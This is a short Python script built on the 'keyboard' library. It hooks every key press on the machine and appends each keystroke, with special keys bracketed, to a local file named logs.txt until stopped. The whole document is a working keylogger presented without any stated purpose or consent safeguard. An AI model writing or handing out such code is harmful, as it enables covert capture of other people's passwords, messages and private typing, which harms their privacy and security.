import keyboard 

def writer(data):
    with open("logs.txt", "a") as file:
        file.write(data)

def filter_key(char):
    if char == "space":
        return " "
    elif len(char) > 1:
        return f"[{char}]"
    else:
        return char

def logger(event):
    writer(filter_key(event.name))

keyboard.on_press(logger)
keyboard.wait()

#ctrl c to stop 